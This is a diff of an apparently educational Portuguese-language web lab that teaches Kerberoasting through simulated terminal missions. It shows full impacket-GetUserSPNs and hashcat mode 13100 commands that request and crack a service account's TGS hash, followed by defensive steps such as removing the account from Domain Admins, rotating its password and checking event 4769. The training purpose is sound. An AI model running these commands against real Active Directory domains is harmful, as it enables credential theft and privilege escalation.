+        output: `[*] Querying 172.24.173.229 for information about domain.\nName           PasswordLastSet\nAdministrator  2026-06-24 10:51:46\nGuest          <never>\nkrbtgt         2026-06-24 11:02:48\nAlice          2026-06-24 11:11:45\nBob            2026-06-24 11:12:49\nsvc_sql        2026-06-24 11:14:10`
+      },
+      {
+        command: "impacket-GetUserSPNs lab.local/alice:'Aluno@123456!' -dc-ip 172.24.173.229 -request -outputfile hashes.txt",
+        hint: 'Localize contas com SPN, solicite o TGS e salve o resultado em hashes.txt.',
+        output: `ServicePrincipalName              Name     MemberOf\nMSSQLSvc/sql.lab.local:1433       svc_sql  CN=Domain Admins,CN=Users,DC=lab,DC=local\n\n[*] Requesting TGS for svc_sql\n[+] Kerberos ticket written to hashes.txt`
+      },
+      {
+        command: 'ls -lh hashes.txt',
+        hint: 'Confirme que o arquivo de hash foi realmente criado.',
+        output: '-rw-r--r-- 1 kali kali 2.1K Jun 25 18:28 hashes.txt'
+      },
+      {
+        command: 'head -n 1 hashes.txt',
+        hint: 'Leia a primeira linha e procure o marcador $krb5tgs$.',
+        output: '$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$8351495a2ae0006c...'
       }
-      if (["ArrowLeft", "PageUp"].includes(event.key)) {
-        event.preventDefault();
-        show(current - 1);
+    ]
+  },
+  crack: {
+    button: 'btn-phase3',
+    tasks: [
+      {
+        command: 'cat wordlist.txt',
+        hint: 'Confira quais senhas candidatas serão testadas.',
+        output: 'herdoc\nPassword123!\nAluno@123456!\nAdmin123!\nEmpresa123!'
+      },
+      {
+        command: 'hashcat -m 13100 hashes.txt wordlist.txt --force',
+        hint: 'Use o modo 13100 para Kerberos 5 TGS-REP etype 23.',
+        output: `Session..........: hashcat\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\nStatus...........: Cracked\nRecovered........: 1/1 (100.00%) Digests\nCandidates.#1....: Password123! -> Empresa123!`
+      },
+      {
+        command: 'hashcat -m 13100 hashes.txt wordlist.txt --show',
+        hint: 'Use --show para relacionar o hash à senha recuperada.',
+        output: '$krb5tgs$23$*svc_sql$LAB.LOCAL$...:Password123!\n[+] Credencial recuperada: svc_sql / Password123!'
       }
-      if (event.key.toLowerCase() === "f") {
-        document.documentElement.requestFullscreen?.();
+    ]
+  },
+  hardening: {
+    button: 'btn-phase4',
+    tasks: [
+      {
+        command: 'Remove-ADGroupMember "Domain Admins" svc_sql -Confirm:$false',
+        hint: 'Comece aplicando o princípio do menor privilégio.',
+        output: '[+] svc_sql removida do grupo Domain Admins.\n[+] Alteração aplicada no Active Directory.'
+      },
+      {
+        command: 'Get-ADPrincipalGroupMembership svc_sql',
+        hint: 'Consulte os grupos restantes para validar a remoção.',
+        output: `name          GroupCategory  GroupScope\n----          -------------  ----------\nDomain Users  Security       Global\n\nValidação: Domain Admins não aparece mais.`
+      },
+      {
+        command: 'Set-ADAccountPassword svc_sql -Reset',
+        hint: 'A senha recuperada deve ser considerada comprometida e rotacionada.',
+        output: 'Solicitação de nova senha segura simulada.\n[+] Senha anterior invalidada e nova senha aleatória aplicada.'
+      },
+      {
+        command: 'Get-ADUser svc_sql -Properties PasswordLastSet',
+        hint: 'Confira o horário da última troca de senha.',
+        output: `SamAccountName  : svc_sql\nEnabled         : True\nPasswordLastSet : 25/06/2026 15:58:03\n\nValidação: o horário confirma a rotação da credencial.`
+      },
+      {
+        command: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 3",
+        hint: 'Consulte o log Security pelo evento que registra solicitações TGS.',
+        output: `TimeCreated          Id    ProviderName\n-----------          --    ------------\n25/06/2026 19:28:14  4769  Microsoft-Windows-Security-Auditing\n25/06/2026 19:28:13  4769  Microsoft-Windows-Security-Auditing\n\nTicket Encryption Type: 0x17 (RC4)\nService Name: svc_sql`
+      }
+    ]
+  }
+};
+
+function saveProgress() {
+  storeState('current-phase', currentPhase);
+  storeState('completed-phases', [...completedPhases]);
+  storeState('hardening-checklist', [...hardeningChecked]);
+  storeState('quiz-passed', quizPassed);
+  storeState('missions', missionState);
+}
+
+// ── NAVEGAÇÃO ──
+function phaseUnlocked(n) {
+  return n === 0 || completedPhases.has(n - 1);
+}
+
+function syncNavigation() {
+  const btns = document.querySelectorAll('.phase-btn');
+  btns.forEach((button, index) => {
+    button.classList.toggle('done', completedPhases.has(index));
+    button.classList.toggle('locked', !phaseUnlocked(index));
+    button.classList.toggle('active', index === currentPhase);
+  });
+  updateProgress();
+}
+
+function goPhase(n) {
+  if (!phaseUnlocked(n)) return;
+  document.querySelectorAll('.phase').forEach(phase => phase.classList.remove('active'));
+  document.getElementById('phase-' + n).classList.add('active');
+  currentPhase = n;
+  saveProgress();
+  syncNavigation();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function completePhase(n) {
+  completedPhases.add(n);
+  saveProgress();
+  syncNavigation();
+  if (n < TOTAL) goPhase(n + 1);
+}
+
+function updateProgress() {
+  const completed = [...completedPhases].filter(n => n < TOTAL).length;
+  const pct = Math.round((completed / TOTAL) * 100);
+  document.getElementById('progress-fill').style.width = pct + '%';
+  document.getElementById('progress-text').textContent = 'MISSÃO: ' + pct + '% concluída';
+}
+
+// ── QUIZ ──
+function quiz(id, el, correct) {
+  const opts = document.querySelectorAll('#' + id + '-opts .quiz-opt');
+  const feedback = document.getElementById(id + '-feedback');
+  if (correct) {
+    quizPassed = true;
+    opts.forEach(option => { option.style.pointerEvents = 'none'; });
+    el.classList.add('correct');
+    feedback.classList.remove('fail');
+    feedback.classList.add('show', 'ok');
+    saveProgress();
+    updateCompletionButtons();
+    return;
+  }
+
+  el.classList.add('wrong');
+  feedback.innerHTML = '<strong>Não exatamente.</strong> Qualquer usuário autenticado pode solicitar TGS para contas com SPN; não precisa ser administrador.';
+  feedback.classList.remove('ok');
+  feedback.classList.add('show', 'fail');
+  setTimeout(() => {
+    el.classList.remove('wrong');
+    feedback.classList.remove('show', 'fail');
+  }, 1800);
+}
+
+// ── TERMINAIS GUIADOS ──
+function normalizeCommand(command) {
+  return command.trim().replace(/\s+/g, ' ').toLowerCase();
+}
+
+function missionPrompt(id) {
+  return id === 'hardening' ? 'PS C:\\AD-Lab>' : 'kali@kali:~$';
+}
+
+function ensureMissionState(id) {
+  if (!missionState[id]) missionState[id] = { done: [], history: [] };
+  return missionState[id];
+}
+
+function missionComplete(id) {
+  return ensureMissionState(id).done.length === missions[id].tasks.length;
+}
+
+function renderMission(id) {
+  const mission = missions[id];
+  const state = ensureMissionState(id);
+  const log = document.getElementById(id + '-log');
+  const status = document.getElementById(id + '-status');
+  if (!log || !status) return;
+
+  const nextTask = mission.tasks[state.done.length];
+  const intro = nextTask
+    ? `Console pronto. Execute as etapas na ordem.\nPróximo objetivo: ${nextTask.command}\nDigite help para entender o motivo do comando.`
+    : 'Todos os objetivos deste console foram validados.';
+  const history = state.history.flatMap(item => [
+    '',
+    `${missionPrompt(id)} ${item.command}`,
+    item.output
+  ]).join('\n');
+  log.textContent = intro + history;
+  log.parentElement.scrollTop = log.parentElement.scrollHeight;
+
+  status.innerHTML = mission.tasks.map((task, index) =>
+    `<span class="mission-chip ${index < state.done.length ? 'done' : ''}">${index + 1}. ${task.command}</span>`
+  ).join('');
+}
+
+function diagnoseCommand(id, command, expected) {
+  const normalized = normalizeCommand(command);
+  if (normalized.startsWith('ping ')) {
+    return normalized.includes('172.24.173.229')
+      ? 'Uso incompleto: envie quatro pacotes com -c 4 para gerar uma evidência curta.'
+      : 'Destino sem resposta. Confira o IP do Domain Controller.';
+  }
+  if (normalized.startsWith('nslookup ')) return 'Informe o domínio lab.local e use 172.24.173.229 como servidor DNS.';
+  if (normalized.includes('getadusers')) return 'A consulta está próxima, mas faltam a credencial correta, -dc-ip ou -all.';
+  if (normalized.includes('getuserspns')) return normalized.includes('-request')
+    ? 'O TGS foi solicitado, mas precisa ser salvo com -outputfile hashes.txt.'
+    : 'O SPN pode ser listado, mas ainda falta -request para solicitar o TGS.';
+  if (normalized.startsWith('hashcat')) return normalized.includes('-m 13100')
+    ? 'Confira os arquivos hashes.txt e wordlist.txt e o objetivo atual.'
+    : 'Modo incorreto: este TGS-REP etype 23 usa o modo 13100.';
+  if (normalized.startsWith('get-winevent')) return 'Filtre o log Security pelo Event ID 4769.';
+  if (id === 'hardening' && /^(get|set|remove)-ad/i.test(command)) {
+    return `O cmdlet foi reconhecido, mas os parâmetros não atendem ao objetivo.\nEsperado: ${expected}`;
+  }
+  return id === 'hardening'
+    ? `O termo '${command.split(' ')[0]}' não foi reconhecido nesta etapa.`
+    : `${command.split(' ')[0]}: command not found`;
+}
+
+function runMission(id) {
+  const mission = missions[id];
+  const state = ensureMissionState(id);
+  const input = document.getElementById(id + '-input');
+  const command = input.value.trim();
+  if (!command) return;
+
+  const nextIndex = state.done.length;
+  const expectedTask = mission.tasks[nextIndex];
+  const matchedIndex = mission.tasks.findIndex(task => normalizeCommand(task.command) === normalizeCommand(command));
+  let output;
+
+  if (normalizeCommand(command) === 'help') {
+    output = expectedTask ? `${expectedTask.hint}\nPróximo comando: ${expectedTask.command}` : 'Este console já foi concluído.';
+  } else if (normalizeCommand(command) === 'clear' || normalizeCommand(command) === 'cls') {
+    clearMissionLog(id);
+    input.value = '';
+    return;
+  } else if (matchedIndex < nextIndex && matchedIndex >= 0) {
+    output = `Etapa já validada.\n${mission.tasks[matchedIndex].output}`;
+  } else if (matchedIndex > nextIndex) {
+    output = `Etapa fora de ordem. Antes disso, execute:\n${expectedTask.command}`;
+  } else if (matchedIndex === nextIndex) {
+    output = expectedTask.output;
+    state.done.push(expectedTask.command);
+  } else {
+    output = diagnoseCommand(id, command, expectedTask ? expectedTask.command : 'fase concluída');
+  }
+
+  state.history.push({ command, output });
+  input.value = '';
+  saveProgress();
+  renderMission(id);
+  updateCompletionButtons();
+}
+
+function missionKey(event, id) {
+  if (event.key === 'Enter') runMission(id);
+}
+
+function fillMissionCommand(id) {
+  const state = ensureMissionState(id);
+  const task = missions[id].tasks[state.done.length];
+  const input = document.getElementById(id + '-input');
+  input.value = task ? task.command : '';
+  input.focus();
+}
+
+function clearMissionLog(id) {
+  ensureMissionState(id).history = [];
+  saveProgress();
+  renderMission(id);
+}
+
+// ── HARDENING ──
+function checkItem(li, id) {
+  if (hardeningChecked.has(id)) {
+    hardeningChecked.delete(id);
+    li.classList.remove('checked');
+    document.getElementById(id + '-box').textContent = '';
+  } else {
+    hardeningChecked.add(id);
+    li.classList.add('checked');
+    document.getElementById(id + '-box').textContent = '✓';
+  }
+  document.getElementById('hard-count').textContent = hardeningChecked.size;
+  saveProgress();
+  updateCompletionButtons();
+}
+
+function updateCompletionButtons() {
+  const phase1 = document.getElementById('btn-phase1');
+  phase1.disabled = !quizPassed;
+  phase1.textContent = quizPassed ? 'Avançar para o Ataque →' : 'Responda o quiz para avançar';
+
+  const phase2 = document.getElementById('btn-phase2');
+  phase2.disabled = !missionComplete('attack');
+  phase2.textContent = missionComplete('attack') ? 'Avançar para Hash Cracking →' : 'Conclua o console para avançar';
+
+  const phase3 = document.getElementById('btn-phase3');
+  phase3.disabled = !missionComplete('crack');
+  phase3.textContent = missionComplete('crack') ? 'Avançar para Hardening →' : 'Conclua o console para avançar';
+  document.getElementById('impact-card').style.display = missionComplete('crack') ? 'block' : 'none';
+
+  const hardeningReady = missionComplete('hardening') && hardeningChecked.size >= 8;
+  const phase4 = document.getElementById('btn-phase4');
+  phase4.disabled = !hardeningReady;
+  phase4.textContent = hardeningReady
+    ? 'Concluir missão →'
+    : `Valide o console e as medidas (${hardeningChecked.size}/8)`;
+}
+
+// ── VISUALIZADOR DE EVIDÊNCIAS ──
+const evidenceViewer = document.getElementById('evidence-viewer');
+const viewerImage = document.getElementById('viewer-image');
+const viewerTitle = document.getElementById('viewer-title');
+const viewerCaption = document.getElementById('viewer-caption');
+const viewerPercent = document.getElementById('viewer-percent');
+const viewerStage = document.getElementById('viewer-stage');
+const viewerMinus = document.getElementById('viewer-minus');
+const viewerPlus = document.getElementById('viewer-plus');
+const viewerClose = document.getElementById('viewer-close');
+let viewerZoom = 1;
+let viewerTrigger = null;
+
+function setViewerZoom(value) {
+  viewerZoom = Math.min(3, Math.max(.5, value));
+  viewerImage.style.transform = `scale(${viewerZoom})`;
+  viewerPercent.textContent = Math.round(viewerZoom * 100) + '%';
+  viewerMinus.disabled = viewerZoom <= .5;
+  viewerPlus.disabled = viewerZoom >= 3;
+}
+
+function openViewer(image) {
+  const figure = image.closest('.evidence-card');
+  viewerTrigger = image;
+  viewerImage.src = image.src;
+  viewerImage.alt = image.alt;
+  viewerTitle.textContent = image.alt;
+  viewerCaption.textContent = figure ? figure.querySelector('figcaption').textContent : image.alt;
+  evidenceViewer.hidden = false;
+  document.body.classList.add('viewer-open');
+  setViewerZoom(1);
+  viewerStage.scrollTop = 0;
+  viewerStage.scrollLeft = 0;
+  viewerClose.focus();
+}
+
+function closeViewer() {
+  if (evidenceViewer.hidden) return;
+  evidenceViewer.hidden = true;
+  document.body.classList.remove('viewer-open');
+  viewerImage.removeAttribute('src');
+  if (viewerTrigger) viewerTrigger.focus();
+}
+
+function bindEvidenceViewer() {
+  document.querySelectorAll('[data-zoomable]').forEach(image => {
+    image.tabIndex = 0;
+    image.setAttribute('role', 'button');
+    image.setAttribute('aria-label', 'Ampliar evidência: ' + image.alt);
+    image.title = 'Ampliar evidência';
+    image.addEventListener('click', () => openViewer(image));
+    image.addEventListener('keydown', event => {
+      if (event.key === 'Enter' || event.key === ' ') {
+        event.preventDefault();
+        openViewer(image);
       }
     });
+  });
 
-    const match = location.hash.match(/slide-(\d+)/);
-    show(match ? Number(match[1]) - 1 : 0);
-  </script>
+  viewerMinus.addEventListener('click', () => setViewerZoom(viewerZoom - .25));
+  viewerPlus.addEventListener('click', () => setViewerZoom(viewerZoom + .25));
+  viewerClose.addEventListener('click', closeViewer);
+  viewerStage.addEventListener('click', event => { if (event.target === viewerStage) closeViewer(); });
+  viewerStage.addEventListener('wheel', event => {
+    event.preventDefault();
+    setViewerZoom(viewerZoom + (event.deltaY < 0 ? .25 : -.25));
+  }, { passive: false });
+  document.addEventListener('keydown', event => {
+    if (evidenceViewer.hidden) return;
+    if (event.key === 'Escape') closeViewer();
+    if (event.key === '+' || event.key === '=') setViewerZoom(viewerZoom + .25);
+    if (event.key === '-') setViewerZoom(viewerZoom - .25);
+  });
+}
+
+function restoreInterface() {
+  document.querySelectorAll('#hardening-list li').forEach((li, index) => {
+    const id = 'h' + (index + 1);
+    const checked = hardeningChecked.has(id);
+    li.classList.toggle('checked', checked);
+    document.getElementById(id + '-box').textContent = checked ? '✓' : '';
+  });
+  document.getElementById('hard-count').textContent = hardeningChecked.size;
+
+  if (quizPassed) {
+    const options = document.querySelectorAll('#q1-opts .quiz-opt');
+    options.forEach(option => { option.style.pointerEvents = 'none'; });
+    if (options[1]) options[1].classList.add('correct');
+    document.getElementById('q1-feedback').classList.add('show', 'ok');
+  }
+
+  Object.keys(missions).forEach(renderMission);
+  updateCompletionButtons();
+  syncNavigation();
+  if (!phaseUnlocked(currentPhase)) currentPhase = 0;
+  goPhase(currentPhase);
+}
+
+function restart() {
+  Object.keys(localStorage)
+    .filter(key => key.startsWith(STORAGE_PREFIX))
+    .forEach(key => localStorage.removeItem(key));
+  currentPhase = 0;
+  completedPhases = new Set();
+  hardeningChecked = new Set();
+  quizPassed = false;
+  missionState = {
+    attack: { done: [], history: [] },
+    crack: { done: [], history: [] },
+    hardening: { done: [], history: [] }
+  };
+  document.querySelectorAll('.quiz-opt').forEach(option => {
+    option.classList.remove('correct', 'wrong');
+    option.style.pointerEvents = '';
+  });
+  document.querySelectorAll('.quiz-feedback').forEach(feedback => feedback.classList.remove('show', 'ok', 'fail'));
+  saveProgress();
+  restoreInterface();
+}
+
+bindEvidenceViewer();
+restoreInterface();
+</script>
 </body>
 </html>
